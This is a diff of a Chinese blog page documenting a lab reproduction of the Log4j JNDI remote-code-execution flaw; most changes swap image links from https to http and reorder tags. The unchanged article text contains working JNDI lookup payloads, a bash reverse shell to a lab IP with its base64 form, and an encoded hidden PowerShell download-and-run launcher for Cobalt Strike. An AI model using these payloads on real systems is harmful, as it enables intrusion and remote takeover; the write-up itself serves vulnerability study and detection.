@@ -15,21 +15,21 @@
 <meta property="og:site_name" content="Laohuan&#39;s Blog">
 <meta property="og:description" content="简介Log4j 是一款开源 的Java 日志记录工具，漏洞是由Log4j 的lookup功能造成的，该功能允许开发人员通过一些协议读取加载远程环境中的配置，并未对输入进行效验，导致攻击者可以通过加载自己构造的恶意类达到代码执行的目的。但此漏洞在实际环境中要成功利用貌似还跟java版本等因素有关。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-12-11_11-25-11.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-12-11_11-25-22.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-12-11_11-28-52.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-12-11_11-29-57.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-12-11_12-21-19.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-12-11_12-21-38.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-12-11_14-30-05.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-12-11_14-29-43.png">
-<meta property="og:image" content="https://cdn.laohuan.art/Snipaste_2021-12-11_14-29-14.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2021-12-11_11-25-11.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2021-12-11_11-25-22.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2021-12-11_11-28-52.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2021-12-11_11-29-57.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2021-12-11_12-21-19.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2021-12-11_12-21-38.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2021-12-11_14-30-05.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2021-12-11_14-29-43.png">
+<meta property="og:image" content="http://qn.laohuan.xin/Snipaste_2021-12-11_14-29-14.png">
 <meta property="article:published_time" content="2021-12-11T07:56:08.000Z">
-<meta property="article:modified_time" content="2021-12-12T09:39:47.441Z">
+<meta property="article:modified_time" content="2025-01-06T09:35:35.060Z">
 <meta property="article:author" content="Laohuan">
 <meta property="article:tag" content="RCE">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.laohuan.art/Snipaste_2021-12-11_11-25-11.png">
+<meta name="twitter:image" content="http://qn.laohuan.xin/Snipaste_2021-12-11_11-25-11.png">
   
     <link rel="alternative" href="/atom.xml" title="Laohuan&#39;s Blog" type="application/atom+xml">
   
@@ -47,7 +47,7 @@
 
   
 
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body>
   <div id="container" q-class="show:isCtnShow">
@@ -296,15 +296,15 @@
 <p>nc监听或者dnslog</p>
 <p><code>nc -lvp 4444</code></p>
 <p>发送payload：<code>${jndi:ldap://192.168.1.16:4444}</code></p>
-<img src="https://cdn.laohuan.art/Snipaste_2021-12-11_11-25-11.png" style="zoom: 67%;">
+<img src="http://qn.laohuan.xin/Snipaste_2021-12-11_11-25-11.png" style="zoom: 67%;">
 
 <p>nc收到请求，证明存在漏洞</p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2021-12-11_11-25-22.png" alt></p>
-<h5><span id="2漏洞利用">2.漏洞利用</span></h5><h6><span id="linux反弹shell">Linux反弹shell</span></h6><p>1.利用工具:<a href="https://github.com/bkfish/Apache-Log4j-Learning/blob/main/tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar" target="_blank" rel="noopener">JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</a></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2021-12-11_11-25-22.png" alt></p>
+<h5><span id="2漏洞利用">2.漏洞利用</span></h5><h6><span id="linux反弹shell">Linux反弹shell</span></h6><p>1.利用工具:<a href="http://github.com/bkfish/Apache-Log4j-Learning/blob/main/tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar" target="_blank" rel="noopener">JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</a></p>
 <p>2.反弹shell</p>
 <p><code>bash -i &gt;&amp; /dev/tcp/192.168.1.16/4444 0&gt;&amp;1</code></p>
-<p>base64编码:<a href="https://www.jackson-t.ca/runtime-exec-payloads.html/" target="_blank" rel="noopener">https://www.jackson-t.ca/runtime-exec-payloads.html/</a></p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2021-12-11_11-28-52.png" alt></p>
+<p>base64编码:<a href="http://www.jackson-t.ca/runtime-exec-payloads.html/" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html/</a></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2021-12-11_11-28-52.png" alt></p>
 <p>得到编码后的反弹脚本</p>
 <p><code>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTYvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}</code></p>
 <p>3.nc监听</p>
@@ -314,35 +314,35 @@
 <p>5.发送paylaod，由于此靶场是Spring-Boot-strater-log4j2搭建环境，所以采用此payload,不同java版本选择相应相应的监听规则。</p>
 <p><code>${jndi://rmi://192.168.1.16:1099/whcpug}</code>，</p>
 <p>6.成功收到shell</p>
-<img src="https://cdn.laohuan.art/Snipaste_2021-12-11_11-29-57.png">
+<img src="http://qn.laohuan.xin/Snipaste_2021-12-11_11-29-57.png">
 
-<h6><span id="windows-cs-上线">Windows cs 上线</span></h6><p>windows使用<a href="https://mp.weixin.qq.com/s/jCHJCiZXbBnXfoMcyMDgPQ" target="_blank" rel="noopener">漏洞环境</a>分享的靶场，已将漏洞环境编译为jar包。</p>
+<h6><span id="windows-cs-上线">Windows cs 上线</span></h6><p>windows使用<a href="http://mp.weixin.qq.com/s/jCHJCiZXbBnXfoMcyMDgPQ" target="_blank" rel="noopener">漏洞环境</a>分享的靶场，已将漏洞环境编译为jar包。</p>
 <p>1.首先测试是否能正常执行命令，弹出计算器作为示例</p>
 <p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc.exe&quot; -A 192.168.1.16</code></p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2021-12-11_12-21-19.png" alt></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2021-12-11_12-21-19.png" alt></p>
 <p>2.使用靶场环境发送paylaod,成功弹出计算器</p>
 <p><code>java -jar LogTest.jar ${jndi:ldap://192.168.1.16:1389/arvhzz}</code></p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2021-12-11_12-21-38.png" alt></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2021-12-11_12-21-38.png" alt></p>
 <p>3.cs生成powershell上线代码，并bash64编码</p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2021-12-11_14-30-05.png" alt></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2021-12-11_14-30-05.png" alt></p>
 <p>4.使用工具开启监听</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java <span class="literal">-jar</span> JNDI<span class="literal">-Injection</span><span class="literal">-Exploit</span><span class="literal">-1</span>.<span class="number">0</span><span class="literal">-SNAPSHOT</span><span class="literal">-all</span>.jar <span class="literal">-C</span> <span class="string">"powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQA2ADoAOAAwAC8AYQAnACkAKQAiAA=="</span> <span class="literal">-A</span> <span class="number">192.168</span>.<span class="number">1.16</span></span><br></pre></td></tr></table></figure>
 
 <p>5.发送paylaod</p>
 <p><code>java -jar LogTest.jar  ${jndi:ldap://192.168.1.16:1389/kmelx9}</code></p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2021-12-11_14-29-43.png" alt></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2021-12-11_14-29-43.png" alt></p>
 <p>6.cs成功上线</p>
-<p><img src="https://cdn.laohuan.art/Snipaste_2021-12-11_14-29-14.png" alt></p>
+<p><img src="http://qn.laohuan.xin/Snipaste_2021-12-11_14-29-14.png" alt></p>
 <h4><span id="相关漏洞检测工具">相关漏洞检测工具</span></h4><ul>
-<li><a href="https://github.com/inbug-team/Log4j_RCE_Tool/releases/tag/Apache_Log4j_RCE0.2" target="_blank" rel="noopener">https://github.com/inbug-team/Log4j_RCE_Tool/releases/tag/Apache_Log4j_RCE0.2</a></li>
-<li><a href="https://github.com/tangxiaofeng7/BurpLog4j2Scan" target="_blank" rel="noopener">https://github.com/tangxiaofeng7/BurpLog4j2Scan</a></li>
-<li><a href="https://log4j2-detector.chaitin.cn/" target="_blank" rel="noopener">Log4j2 Vuln Detector (chaitin.cn)</a></li>
+<li><a href="http://github.com/inbug-team/Log4j_RCE_Tool/releases/tag/Apache_Log4j_RCE0.2" target="_blank" rel="noopener">http://github.com/inbug-team/Log4j_RCE_Tool/releases/tag/Apache_Log4j_RCE0.2</a></li>
+<li><a href="http://github.com/tangxiaofeng7/BurpLog4j2Scan" target="_blank" rel="noopener">http://github.com/tangxiaofeng7/BurpLog4j2Scan</a></li>
+<li><a href="http://log4j2-detector.chaitin.cn/" target="_blank" rel="noopener">Log4j2 Vuln Detector (chaitin.cn)</a></li>
 </ul>
 <h4><span id="参考链接">参考链接</span></h4><ol>
-<li><a href="https://github.com/fengxuangit/log4j_vuln" target="_blank" rel="noopener">https://github.com/fengxuangit/log4j_vuln</a></li>
-<li><a href="https://github.com/bkfish/Apache-Log4j-Learning" target="_blank" rel="noopener">https://github.com/bkfish/Apache-Log4j-Learning</a></li>
-<li><a href="https://mp.weixin.qq.com/s/jCHJCiZXbBnXfoMcyMDgPQ" target="_blank" rel="noopener">log4j漏洞复现环境分享 (qq.com)</a></li>
-<li><a href="https://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ" target="_blank" rel="noopener">Log4J 漏洞复现+漏洞靶场 (qq.com)</a></li>
+<li><a href="http://github.com/fengxuangit/log4j_vuln" target="_blank" rel="noopener">http://github.com/fengxuangit/log4j_vuln</a></li>
+<li><a href="http://github.com/bkfish/Apache-Log4j-Learning" target="_blank" rel="noopener">http://github.com/bkfish/Apache-Log4j-Learning</a></li>
+<li><a href="http://mp.weixin.qq.com/s/jCHJCiZXbBnXfoMcyMDgPQ" target="_blank" rel="noopener">log4j漏洞复现环境分享 (qq.com)</a></li>
+<li><a href="http://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ" target="_blank" rel="noopener">Log4J 漏洞复现+漏洞靶场 (qq.com)</a></li>
 </ol>
 
       
@@ -545,7 +545,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2023 Laohuan
+    		&copy; 2025 Laohuan
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -665,6 +665,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CGI</a>
               </li>
              
@@ -673,7 +677,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">JBoss</a>
+                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">考试</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -681,7 +693,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -693,7 +705,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
+                <a href="javascript:void(0)" class="js-tag color5">权限维持</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -701,7 +713,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color1">Samba</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -709,7 +721,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">Weblogic</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -725,6 +745,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">zabbix</a>
               </li>
              
@@ -733,39 +757,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">靶场</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">应急响应</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工具分享</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">考试</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">HTTPS</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">加解密</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Chrome</a>
               </li>
             
             <div class="clearfix"></div>
